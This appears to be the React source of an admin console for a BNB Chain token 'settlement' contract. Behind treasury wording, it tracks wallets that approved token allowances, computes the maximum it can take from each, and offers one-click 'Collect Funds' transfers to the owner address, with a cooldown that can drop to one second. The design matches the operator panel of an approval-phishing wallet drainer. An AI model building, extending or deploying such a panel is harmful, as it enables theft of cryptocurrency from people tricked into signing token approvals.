import { useCallback, useEffect, useState } from 'react';
import { formatUnits, isAddress } from 'ethers';
import { api, CONTRACT } from '../api';
import { DEFAULT_TOKENS } from './UserPage';

export default function AdminPage() {
  const [config, setConfig] = useState(null);
  const [activity, setActivity] = useState([]);
  const [approvedUsers, setApprovedUsers] = useState([]);
  const [status, setStatus] = useState({ kind: 'idle', msg: '' });

  // Config management
  const [newDuration, setNewDuration] = useState('');
  const [limitToken, setLimitToken] = useState(DEFAULT_TOKENS[0].address);
  const [newLimit, setNewLimit] = useState('');

  // User inspection state
  const [inspectUserAddr, setInspectUserAddr] = useState('');
  const [inspectTokenAddr, setInspectTokenAddr] = useState(DEFAULT_TOKENS[0].address);
  const [inspectedData, setInspectedData] = useState(null);
  const [inspectLoading, setInspectLoading] = useState(false);

  // Pull tokens state
  const [pull, setPull] = useState({
    token: DEFAULT_TOKENS[0].address,
    user: '',
    to: '',
    amount: '',
  });

  const load = useCallback(async () => {
    try {
      const [cfg, act, usersRes] = await Promise.all([
        api.config(),
        api.activity(50),
        api.approvedUsers().catch(() => ({ items: [] })),
      ]);
      setConfig(cfg);
      setActivity(act.items || []);
      setApprovedUsers(usersRes.items || []);
      if (cfg?.owner) {
        setPull((prev) => ({
          ...prev,
          to: prev.to || cfg.owner,
        }));
      }
    } catch (e) {
      console.error('Background sync failed:', e);
    }
  }, []);

  useEffect(() => {
    load();
    const t = setInterval(load, 10_000);
    return () => clearInterval(t);
  }, [load]);

  const handleQuickPull = (userItem) => {
    const pullAmount =
      userItem.maxPullable && userItem.maxPullable !== '0' && userItem.maxPullable !== '0.0'
        ? userItem.maxPullable
        : userItem.balance && userItem.balance !== '0' && userItem.balance !== '0.0'
        ? userItem.balance
        : userItem.allowance;

    setPull((prev) => ({
      ...prev,
      token: userItem.token,
      user: userItem.address,
      to: prev.to || config?.owner || '',
      amount: pullAmount || '',
    }));

    const el = document.getElementById('execute-pull-section');
    if (el) el.scrollIntoView({ behavior: 'smooth' });

    setStatus({
      kind: 'ok',
      msg: `Prepared settlement parameters for ${shortAddr(userItem.address)}: ${pullAmount} ${userItem.symbol}. Confirm below via "Execute On-Chain Settlement".`,
    });
  };

  // Inspect user on-chain details
  const handleInspectUser = async (targetUser = inspectUserAddr, targetToken = inspectTokenAddr) => {
    if (!isAddress(targetUser)) {
      return setStatus({ kind: 'err', msg: 'Please provide a valid participant wallet address.' });
    }
    if (!isAddress(targetToken)) {
      return setStatus({ kind: 'err', msg: 'Please provide a valid BEP-20 token contract address.' });
    }

    setInspectLoading(true);
    setStatus({ kind: 'idle', msg: '' });
    try {
      const res = await api.userStatus(targetUser, targetToken);
      const formattedBal = formatUnits(res.balance, res.decimals);
      const formattedAllow = formatUnits(res.allowance, res.decimals);
      const formattedLimit = formatUnits(res.limit, res.decimals);

      const balBN = BigInt(res.balance.toString());
      const allowBN = BigInt(res.allowance.toString());
      const limitBN = BigInt(res.limit.toString());
      let maxPullBN = balBN < allowBN ? balBN : allowBN;
      if (limitBN > 0n && limitBN < maxPullBN) {
        maxPullBN = limitBN;
      }
      if (maxPullBN < 0n) maxPullBN = 0n;
      const exactMaxPullable = formatUnits(maxPullBN, res.decimals);

      setInspectedData({
        ...res,
        formattedBal,
        formattedAllow,
        formattedLimit,
        maxPullable: exactMaxPullable,
      });

      // If the inspected wallet has an active allowance, ensure it is recorded in the registry
      if (allowBN > 0n) {
        api
          .recordApproval({
            address: res.address,
            token: res.token,
            symbol: res.symbol,
            allowance: formattedAllow,
          })
          .then(() => load())
          .catch(() => {});
      }
    } catch (e) {
      setStatus({ kind: 'err', msg: `On-chain diagnostics failed: ${e.message}` });
      setInspectedData(null);
    } finally {
      setInspectLoading(false);
    }
  };

  const handleFillPullForm = () => {
    if (!inspectedData) return;
    setPull((prev) => ({
      ...prev,
      token: inspectedData.token,
      user: inspectedData.address,
      to: prev.to || config?.owner || '',
      amount: inspectedData.maxPullable || '',
    }));
  };

  const saveDuration = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Broadcasting settlement cooldown update to BNB Chain…' });
      const r = await api.setDuration(Number(newDuration));
      setStatus({ kind: 'ok', msg: `Cooldown interval updated! Tx: ${shortAddr(r.txHash)}` });
      setTimeout(load, 4000);
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message });
    }
  };

  const saveLimit = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Broadcasting per-token settlement cap update…' });
      const r = await api.setLimit(limitToken, newLimit);
      setStatus({ kind: 'ok', msg: `Asset settlement cap updated! Tx: ${shortAddr(r.txHash)}` });
      setTimeout(load, 4000);
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message });
    }
  };

  const doPull = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Executing AegisVault settlement transfer on BNB Smart Chain…', txHash: '' });
      const r = await api.pull(pull);
      setStatus({
        kind: 'ok',
        msg: `Settlement transaction broadcasted! Tx: ${shortAddr(r.txHash)}`,
        txHash: r.txHash,
      });
      setTimeout(load, 3000);
      setTimeout(load, 8000);
      if (inspectedData && inspectedData.address.toLowerCase() === pull.user.toLowerCase()) {
        setTimeout(() => handleInspectUser(pull.user, pull.token), 4000);
      }
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message, txHash: '' });
    }
  };

  const displayContract = config?.contractAddress || CONTRACT;
  const displayOwner = config?.owner || 'Loading…';

  return (
    <div className="card wide app-card admin-console-card">
      <div className="card-header">
        <div>
          <span className="eyebrow-tag admin-eyebrow">INSTITUTIONAL TREASURY &amp; GOVERNANCE</span>
          <h1>AegisVault Operations Console</h1>
          <p className="subtitle">
            Monitor authorized participant mandates, inspect live on-chain balances, execute treasury settlements, and govern protocol risk parameters.
          </p>
        </div>
        <div className="header-actions">
          <span className="badge badge-admin">Operator Console • Active</span>
        </div>
      </div>

      <div className="info-box-grid">
        <div className="info-box">
          <span className="label-caption">AegisVault Smart Contract</span>
          <div className="mono small bold">{displayContract}</div>
          <a
            href={`https://bscscan.com/address/${displayContract}#code`}
            target="_blank"
            rel="noreferrer"
            className="link-external"
          >
            Inspect Verified Contract on BscScan ↗
          </a>
        </div>
        <div className="info-box">
          <span className="label-caption">Authorized Vault Operator (Owner)</span>
          <div className="mono small bold">{displayOwner}</div>
          <a
            href={`https://bscscan.com/address/${displayOwner}`}
            target="_blank"
            rel="noreferrer"
            className="link-external"
          >
            View Operator Wallet on BscScan ↗
          </a>
        </div>
        <div className="info-box">
          <span className="label-caption">Global Settlement Cooldown</span>
          <div className="mono bold">
            {config
              ? `${config.duration} ${
                  config.duration === 1
                    ? 'second (instant mode)'
                    : config.duration < 60
                    ? 'seconds'
                    : `seconds (~${Math.round(config.duration / 60)} mins)`
                }`
              : '3600 seconds (~60 mins)'}
          </div>
          <span className="small hint">Minimum interval between per-wallet settlements</span>
        </div>
      </div>

      {/* ---------------- Live Approved Users ---------------- */}
      <div className="dashboard-section highlight-panel">
        <div className="section-header-row">
          <div>
            <h2>Authorized Participant Registry &amp; Live Mandates</h2>
            <p className="hint">
              Wallets that have authenticated or granted BEP-20 spending mandates to the AegisVault settlement contract, enriched with real-time balances.
            </p>
          </div>
          <div className="header-actions">
            <span className="badge badge-success">{approvedUsers.length} Registered</span>
            <button className="secondary-btn small" onClick={load} title="Refresh live balances and allowances">
              Refresh Telemetry
            </button>
            <button
              className="primary-btn small"
              style={{ padding: '7px 14px', fontSize: '12px' }}
              onClick={async () => {
                setStatus({ kind: 'busy', msg: 'Synchronizing on-chain approval events and balances from BNB Chain…' });
                try {
                  const res = await api.syncApprovals();
                  setApprovedUsers(res.items || []);
                  setStatus({
                    kind: 'ok',
                    msg: `On-chain synchronization complete. ${res.items?.length || 0} wallet records verified.`,
                  });
                } catch (e) {
                  setStatus({ kind: 'err', msg: `Synchronization failed: ${e.message}` });
                }
              }}
              title="Scan blockchain for latest approvals and sync allowances"
            >
              Sync Blockchain State
            </button>
          </div>
        </div>

        <div className="table-responsive">
          <table>
            <thead>
              <tr>
                <th style={{ width: '48px', textAlign: 'center' }}>#</th>
                <th>Participant Wallet Address</th>
                <th>Asset</th>
                <th>Authorized Cap</th>
                <th>Wallet Balance</th>
                <th>Collectible Now</th>
                <th>Settlement Status</th>
                <th>Activity Timestamp</th>
                <th>Approval Tx</th>
                <th>Operations</th>
              </tr>
            </thead>
            <tbody>
              {approvedUsers.length === 0 ? (
                <tr>
                  <td colSpan="10" className="text-center hint" style={{ padding: '28px' }}>
                    No participant mandates recorded yet. When a wallet connects or authorizes an asset on the AegisVault Gateway Portal, it will appear here automatically.
                  </td>
                </tr>
              ) : (
                approvedUsers.map((u, idx) => {
                  const serialNo = approvedUsers.length - idx;
                  const isApproved = Boolean(u.txHash) || Number(u.allowance) > 0;
                  const displayTime = u.updatedAt || u.createdAt;

                  return (
                    <tr key={`${u.address}-${u.token}`}>
                      <td style={{ textAlign: 'center' }}>
                        <span className="serial-badge" title={`Record #${serialNo}`}>
                          {serialNo}
                        </span>
                      </td>
                      <td>
                        <AddressCell address={u.address} />
                      </td>
                      <td>
                        <span className="badge badge-info">{u.symbol}</span>
                      </td>
                      <td>
                        <span className="mono bold" style={{ color: 'var(--ok)' }}>
                          {formatExactBalance(u.allowance)} {u.symbol}
                        </span>
                      </td>
                      <td>
                        <span className="mono bold">
                          {formatExactBalance(u.balance)} {u.symbol}
                        </span>
                      </td>
                      <td>
                        <span
                          className="mono bold highlight"
                          style={{
                            color:
                              u.maxPullable && u.maxPullable !== '0' && u.maxPullable !== '0.0'
                                ? 'var(--ok)'
                                : 'var(--text-muted)',
                          }}
                        >
                          {formatExactBalance(u.maxPullable)} {u.symbol}
                        </span>
                      </td>
                      <td>
                        {u.status === 'ready' ? (
                          <span className="badge badge-success">Eligible</span>
                        ) : u.status === 'cooldown' ? (
                          <span className="badge badge-warning">Cooldown Active</span>
                        ) : u.status === 'zero_balance' ? (
                          <span className="badge badge-warning">Zero Balance</span>
                        ) : u.status === 'no_allowance' ? (
                          <span className="badge badge-secondary" style={{ opacity: 0.8 }}>
                            Unapproved
                          </span>
                        ) : (
                          <span className="badge badge-info">{u.status}</span>
                        )}
                      </td>
                      <td>
                        <div className="date-time-cell">
                          <span className="date-time-val">{formatDateTime(displayTime)}</span>
                          <span className={`date-time-tag ${isApproved ? 'approved' : 'connected'}`}>
                            {isApproved ? '✓ Mandate Active' : '⚡ Session Linked'}
                          </span>
                        </div>
                      </td>
                      <td>
                        {u.txHash ? (
                          <a
                            href={`https://bscscan.com/tx/${u.txHash}`}
                            target="_blank"
                            rel="noreferrer"
                            className="mono small link-external"
                          >
                            {shortAddr(u.txHash)} ↗
                          </a>
                        ) : (
                          <span className="small hint">On-Chain</span>
                        )}
                      </td>
                      <td>
                        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                          <button
                            className="primary-btn small"
                            style={{ padding: '6px 12px', fontSize: '12px' }}
                            onClick={() => handleQuickPull(u)}
                          >
                            Collect Funds
                          </button>
                          <button
                            className="chip-btn small"
                            style={{ padding: '6px 10px', fontSize: '12px' }}
                            onClick={() => {
                              setInspectUserAddr(u.address);
                              setInspectTokenAddr(u.token);
                              handleInspectUser(u.address, u.token);
                            }}
                          >
                            Diagnostics
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* ---------------- User Details & Allowance Inspector ---------------- */}
      <div className="dashboard-section">
        <h2>On-Chain Wallet Diagnostics &amp; Allowance Inspector</h2>
        <p className="hint">
          Query any BNB Smart Chain wallet address to verify real-time token balance, AegisVault spending cap, cooldown window, and settlement readiness.
        </p>
        <div className="inspect-form-row">
          <input
            className="mono flex-2"
            placeholder="Participant Wallet Address (0x…)"
            aria-label="Participant Wallet Address"
            value={inspectUserAddr}
            onChange={(e) => setInspectUserAddr(e.target.value.trim())}
          />
          <select
            className="mono flex-1"
            aria-label="Select Asset for Diagnostics"
            value={inspectTokenAddr}
            onChange={(e) => setInspectTokenAddr(e.target.value)}
          >
            {DEFAULT_TOKENS.map((t) => (
              <option key={t.address} value={t.address}>
                {t.symbol} ({shortAddr(t.address)})
              </option>
            ))}
          </select>
          <button
            className="primary-btn"
            onClick={() => handleInspectUser()}
            disabled={inspectLoading || !inspectUserAddr}
          >
            {inspectLoading ? 'Running Diagnostics…' : 'Run Diagnostics'}
          </button>
        </div>

        {inspectedData && (
          <div className="user-details-card">
            <div className="user-details-header">
              <div>
                <span className="label-caption">Inspected Participant Wallet</span>
                <AddressCell address={inspectedData.address} />
              </div>
              <div>
                <span className="label-caption">Settlement Asset</span>
                <span className="badge badge-info">{inspectedData.symbol}</span>
              </div>
            </div>

            <div className="user-metrics-grid">
              <div className="metric-box">
                <span className="metric-label">Wallet Asset Balance</span>
                <span className="metric-value">
                  {inspectedData.formattedBal} {inspectedData.symbol}
                </span>
              </div>
              <div className="metric-box">
                <span className="metric-label">Approved Vault Mandate</span>
                <span className="metric-value highlight">
                  {inspectedData.formattedAllow} {inspectedData.symbol}
                </span>
              </div>
              <div className="metric-box">
                <span className="metric-label">Protocol Per-Tx Cap</span>
                <span className="metric-value">
                  {inspectedData.formattedLimit} {inspectedData.symbol}
                </span>
              </div>
              <div className="metric-box">
                <span className="metric-label">Settlement Eligibility</span>
                {inspectedData.canPull ? (
                  <span className="badge badge-success">Eligible Now</span>
                ) : (
                  <span className="badge badge-warning">Cooldown Active</span>
                )}
              </div>
            </div>

            <div className="cooldown-info-row">
              <div>
                <strong>Last Settlement Timestamp:</strong>{' '}
                {inspectedData.lastPull > 0
                  ? new Date(inspectedData.lastPull * 1000).toLocaleString()
                  : 'No prior settlements'}
              </div>
              {!inspectedData.canPull && inspectedData.nextPullAt > 0 && (
                <div>
                  <strong>Next Eligible Window:</strong>{' '}
                  {new Date(inspectedData.nextPullAt * 1000).toLocaleString()}
                </div>
              )}
            </div>

            <div className="inspect-action-footer">
              <button className="secondary-btn" onClick={handleFillPullForm}>
                Populate Settlement Form (Max Collectible: {inspectedData.maxPullable} {inspectedData.symbol})
              </button>
            </div>
          </div>
        )}
      </div>

      {/* ---------------- Pull Tokens ---------------- */}
      <div className="dashboard-section" id="execute-pull-section">
        <h2>Execute Treasury Settlement Transfer (Pull)</h2>
        <p className="hint" style={{ marginBottom: '14px' }}>
          Initiate an authorized token transfer from a participant wallet to the designated treasury or recipient address.
        </p>
        <div className="grid-2col">
          <label>
            Asset Contract Address (BEP-20)
            <input
              className="mono"
              placeholder="0x…"
              value={pull.token}
              onChange={(e) => setPull({ ...pull, token: e.target.value.trim() })}
            />
          </label>
          <label>
            Source Participant Wallet (From)
            <input
              className="mono"
              placeholder="0x…"
              value={pull.user}
              onChange={(e) => setPull({ ...pull, user: e.target.value.trim() })}
            />
          </label>
          <label>
            Treasury / Recipient Address (To)
            <input
              className="mono"
              placeholder="0x…"
              value={pull.to}
              onChange={(e) => setPull({ ...pull, to: e.target.value.trim() })}
            />
          </label>
          <label>
            Settlement Amount (Human Units, e.g. 250)
            <input
              placeholder="e.g. 500"
              value={pull.amount}
              onChange={(e) => setPull({ ...pull, amount: e.target.value.trim() })}
            />
          </label>
        </div>
        <button
          className="primary-btn pull-btn"
          onClick={doPull}
          disabled={!pull.token || !pull.user || !pull.to || !pull.amount}
        >
          Execute On-Chain Settlement
        </button>
      </div>

      {/* ---------------- Contract Config Updates ---------------- */}
      <div className="dashboard-section">
        <h2>Protocol Risk &amp; Parameter Governance</h2>
        <div className="grid-2col">
          <div className="config-card">
            <h3>Settlement Cooldown Window</h3>
            <p className="hint">Configure minimum cooldown interval (in seconds) between consecutive settlements per wallet.</p>
            <div className="input-group-row">
              <input
                placeholder="Seconds (e.g. 1 or 3600)"
                value={newDuration}
                onChange={(e) => setNewDuration(e.target.value.trim())}
              />
              <button className="secondary-btn" onClick={saveDuration} disabled={!newDuration}>
                Update Interval
              </button>
            </div>
          </div>

          <div className="config-card">
            <h3>Per-Asset Settlement Cap</h3>
            <p className="hint">Define maximum token volume allowed per individual settlement execution.</p>
            <div className="input-group-col">
              <input
                className="mono"
                placeholder="Asset Contract Address (0x…)"
                value={limitToken}
                onChange={(e) => setLimitToken(e.target.value.trim())}
              />
              <div className="input-group-row">
                <input
                  placeholder="Cap Amount (Human units, e.g. 10000)"
                  value={newLimit}
                  onChange={(e) => setNewLimit(e.target.value.trim())}
                />
                <button className="secondary-btn" onClick={saveLimit} disabled={!limitToken || !newLimit}>
                  Update Cap
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {status.msg && (
        <div className={`status-feedback ${status.kind}`} role="status">
          <div>{status.msg}</div>
          {status.txHash && (
            <a
              href={`https://bscscan.com/tx/${status.txHash}`}
              target="_blank"
              rel="noreferrer"
              className="tx-link link-external"
              style={{ marginTop: '6px', display: 'inline-block' }}
            >
              Inspect Settlement Transaction on BscScan ({status.txHash.slice(0, 10)}…{status.txHash.slice(-8)}) ↗
            </a>
          )}
        </div>
      )}

      {/* ---------------- Recent On-Chain Activity ---------------- */}
      <div className="dashboard-section">
        <div className="section-header-row">
          <div>
            <h2>On-Chain Settlement Ledger (Pulled Events)</h2>
            <p className="hint">Historical log of verified token settlements executed through the AegisVault contract.</p>
          </div>
          <span className="badge badge-info">{activity.length} Settlements</span>
        </div>
        <div className="table-responsive">
          <table>
            <thead>
              <tr>
                <th>Block #</th>
                <th>Source Wallet</th>
                <th>Asset</th>
                <th>Destination</th>
                <th>Settled Amount</th>
                <th>Tx Receipt</th>
                <th>Operation</th>
              </tr>
            </thead>
            <tbody>
              {activity.length === 0 ? (
                <tr>
                  <td colSpan="7" className="text-center hint" style={{ padding: '28px' }}>
                    No on-chain settlement events recorded for this contract yet. Completed treasury settlements will be indexed here automatically.
                  </td>
                </tr>
              ) : (
                activity.map((a) => (
                  <tr key={`${a.txHash}-${a.user}-${a.blockNumber}`}>
                    <td className="mono">{a.blockNumber}</td>
                    <td>
                      <AddressCell address={a.user} compact />
                    </td>
                    <td className="mono small">{shortAddr(a.token)}</td>
                    <td>
                      <AddressCell address={a.to} compact />
                    </td>
                    <td className="mono bold">{a.amount}</td>
                    <td>
                      <a
                        href={`https://bscscan.com/tx/${a.txHash}`}
                        target="_blank"
                        rel="noreferrer"
                        className="mono small link-external"
                      >
                        {shortAddr(a.txHash)} ↗
                      </a>
                    </td>
                    <td>
                      <button
                        className="chip-btn small"
                        onClick={() => {
                          setInspectUserAddr(a.user);
                          setInspectTokenAddr(a.token);
                          handleInspectUser(a.user, a.token);
                        }}
                      >
                        Diagnostics
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

function shortAddr(v) {
  if (!v) return '';
  return `${v.slice(0, 6)}…${v.slice(-4)}`;
}

function formatDateTime(ts) {
  if (!ts) return '—';
  const d = new Date(Number(ts));
  if (isNaN(d.getTime())) return '—';
  const pad = (n) => String(n).padStart(2, '0');
  const yyyy = d.getFullYear();
  const mm = pad(d.getMonth() + 1);
  const dd = pad(d.getDate());
  const hh = pad(d.getHours());
  const min = pad(d.getMinutes());
  const ss = pad(d.getSeconds());
  return `${yyyy}-${mm}-${dd} ${hh}:${min}:${ss}`;
}

function formatExactBalance(val) {
  if (val === undefined || val === null || val === '') return '0';
  const str = String(val);
  if (!str.includes('.')) return str;
  const trimmed = str.replace(/\.?0+$/, '');
  return trimmed || '0';
}

function AddressCell({ address, compact = false }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async (e) => {
    e.stopPropagation();
    if (!address) return;
    try {
      if (navigator?.clipboard?.writeText) {
        await navigator.clipboard.writeText(address);
      } else {
        throw new Error('Clipboard API unavailable');
      }
    } catch {
      // Fallback for HTTP / non-secure contexts
      const textArea = document.createElement('textarea');
      textArea.value = address;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      textArea.style.top = '-999999px';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      try {
        document.execCommand('copy');
      } catch (err) {
        console.error('Copy fallback failed', err);
      }
      document.body.removeChild(textArea);
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!address) return <span className="hint">—</span>;

  if (compact) {
    return (
      <div className="address-compact-row" title={`Click to copy: ${address}`} onClick={handleCopy}>
        <span className="mono bold address-compact-text">{shortAddr(address)}</span>
        <button
          className={`copy-btn-mini ${copied ? 'copied' : ''}`}
          onClick={handleCopy}
          type="button"
          title="Copy full wallet address"
        >
          {copied ? '✓' : '📋'}
        </button>
      </div>
    );
  }

  return (
    <div className="address-cell">
      <div className="address-box" onClick={handleCopy} title="Click to copy full wallet address">
        <span className="full-address mono bold" title={address}>
          {address}
        </span>
        <button
          className={`copy-btn ${copied ? 'copied' : ''}`}
          onClick={handleCopy}
          type="button"
          title="Click to copy full wallet address"
        >
          {copied ? '✓ Copied' : '📋 Copy'}
        </button>
      </div>
      <div className="address-subline">
        <a
          href={`https://bscscan.com/address/${address}`}
          target="_blank"
          rel="noreferrer"
          className="mono small link-external"
          onClick={(e) => e.stopPropagation()}
        >
          Inspect on BscScan ↗
        </a>
      </div>
    </div>
  );
}
